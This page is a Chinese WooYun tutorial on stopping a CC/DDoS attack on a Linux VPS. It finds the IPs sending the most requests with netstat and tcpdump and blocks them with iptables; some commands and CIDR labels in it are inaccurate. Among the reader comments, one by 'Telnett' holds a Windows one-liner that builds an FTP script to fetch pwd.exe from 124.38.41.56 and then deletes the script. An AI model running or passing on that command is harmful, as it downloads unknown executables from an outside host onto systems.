<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Linux被DDOS&amp;CC攻击解决实例</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">豆子</a> <span class="bull">·</span> <time title="2014/06/27 17:01" ui-time="" datetime="2014/06/27 17:01" class="published ng-binding ng-isolate-scope">2014/06/27 17:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>这两天一个客户反映自己的网站经常出现mysql 1040错误，他的在线用户才不到一千，mysql配置也没问题，vps用的时linode160+刀一个月的。</p><p>没理由出现这种情况，于是，我进行了一系列的排查。top了一下，mysqld跑到了900%多。</p><h2>0x01 解决方案&amp;思路</h2><hr><p>我怀疑是CC攻击，鉴于系统是centos，我运行了下面的这两行命令。</p><pre><code>netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20 | netstat -ant |awk '/:80/{split($5,ip,":");++A[ip[1]]}END{for(i in A) print A[i],i}' |sort -rn|head -n20 
</code></pre><p>把请求过多的IP记录下来。</p><pre><code>174.127.94.*
199.27.128.*
199.27.133.*
</code></pre><p>开始封禁IP，具体可以看我下面运行的命令。本文主要是采用iptables进行封禁，iptables使用方法请见：<a href="http://drops.wooyun.org/tips/1424">Iptables入门教程</a></p><pre><code>iptables -I INPUT -s 174.127.94.0/16 -j DROP
iptables -I INPUT -s 199.27.128.0/16 -j DROP
iptables -I INPUT -s 199.27.133.0/16 -j DROP
iptables -I INPUT -s 193.1.0.0/8 -j DROP 【慎用封禁整个段】
</code></pre><p>运行上面这些命令之后我们已经完成封禁操作了，不过还得保存一下，如果不保存的话重启系统之后上面设定的规则会消失。</p><pre><code>service iptables save 
</code></pre><p>运行下面这行命令，来查看谁的访问量最高（需要服务器安装tcpdump）</p><pre><code>tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F"." '{print $1"."$2"."$3"."$4}' | sort | uniq -c | sort -nr |head -20 

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
1000 packets captured
1000 packets received by filter
0 packets dropped by kernel
1420 IP 174.7.7.*
</code></pre><p>然后将packets过多的IP记录下来，用上面的方法封禁。</p><p>运行</p><pre><code>service iptables save 
</code></pre><p>保存然后重启</p><pre><code>iptables service iptables restart 
</code></pre><p>这一步建议多进行几次，发现异常IP用上面的办法封禁。如果出现误封可以参考下面这行解封命令进行解封</p><pre><code>iptables -D INPUT -s 222.142.2.0/16 -j DROP
</code></pre><h2>0x02 常用命令</h2><hr><p>封单个IP的命令是：</p><pre><code>iptables -I INPUT -s 211.1.0.0 -j DROP
</code></pre><p>封IP段的命令是：</p><pre><code>iptables -I INPUT -s 211.1.0.0/16 -j DROP
iptables -I INPUT -s 211.2.0.0/16 -j DROP
iptables -I INPUT -s 211.3.0.0/16 -j DROP
</code></pre><p>封整个B段的命令是：</p><pre><code>iptables -I INPUT -s 211.0.0.0/8 -j DROP
</code></pre><p>封几个段的命令是：</p><pre><code>iptables -I INPUT -s 61.37.80.0/24 -j DROP
iptables -I INPUT -s 61.37.81.0/24 -j DROP
</code></pre><h2>0x03 后续</h2><hr><p>进行了上面的操作之后，客户的网站正常了，几乎秒开，当然这和他的vps给力也有一定的关系。top了一下，服务器资源也正常了。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1424" rel="bookmark" id="re1">Iptables入门教程</a></li><li><a href="http://drops.wooyun.org/papers/865" rel="bookmark" id="re2">Memcache安全配置</a></li><li><a href="http://drops.wooyun.org/tips/352" rel="bookmark" id="re3">SVN安装配置及安全注意事项</a></li><li><a href="http://drops.wooyun.org/tips/2014" rel="bookmark" id="re4">批量网站DNS区域传送漏洞检测——bash shell实现</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dig</span> <span class="reply-time">2016-03-22 22:07:29</span></div><p></p><p>@Lenwood我也这么觉得</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">果果</span> <span class="reply-time">2016-02-12 20:35:13</span></div><p></p><p>谢谢哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sfcuboy</span> <span class="reply-time">2014-09-20 18:34:04</span></div><p></p><p>根据ip封禁误伤太大</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lesion</span> <span class="reply-time">2014-08-07 10:50:17</span></div><p></p><p>自动脚本~白名单~设置封禁期限~然后基本上就OK了~不然iptables 会爆的~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Telnett</span> <span class="reply-time">2014-07-09 13:53:01</span></div><p></p><p>echo open 124.38.41.56&gt;o&amp;echo username&gt;&gt;o&amp;echo password&gt;&gt;o&amp;echo get pwd.exe&gt;&gt;o&amp;echo quit&gt;&gt;o&amp;ftp -s:o&amp;echo off&gt;o&amp;echo on&amp;del /f/q</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Lenwood</span> <span class="reply-time">2014-06-30 10:09:21</span></div><p></p><p>这几乎不是个解决方案。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxoo</span> <span class="reply-time">2014-06-30 09:34:35</span></div><p></p><p>你这还不如说是iptables的简单用法呢，，</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">depycode</span> <span class="reply-time">2014-06-29 14:18:46</span></div><p></p><p>牛！！！awk用得好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小森森</span> <span class="reply-time">2014-06-28 17:33:57</span></div><p></p><p>棒！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">不告诉你</span> <span class="reply-time">2014-06-27 23:39:01</span></div><p></p><p>什么办法？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">水泥中的鱼</span> <span class="reply-time">2014-06-27 23:04:20</span></div><p></p><p>自动实现过一个脚本，然后~~~IPTABLE被写满了~~哎，后来想别的办法解决了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">豆子</span> <span class="reply-time">2014-06-27 19:04:55</span></div><p></p><p>是的，不过要配合个白名单，否则有误杀风险，如果开CDN的情况下。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2014-06-27 18:59:20</span></div><p></p><p>可以写个自动脚本了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">【|→上善若水】</span> <span class="reply-time">2014-06-27 17:21:12</span></div><p></p><p>good~~~</p><p></p></div></div></div></div></div></main>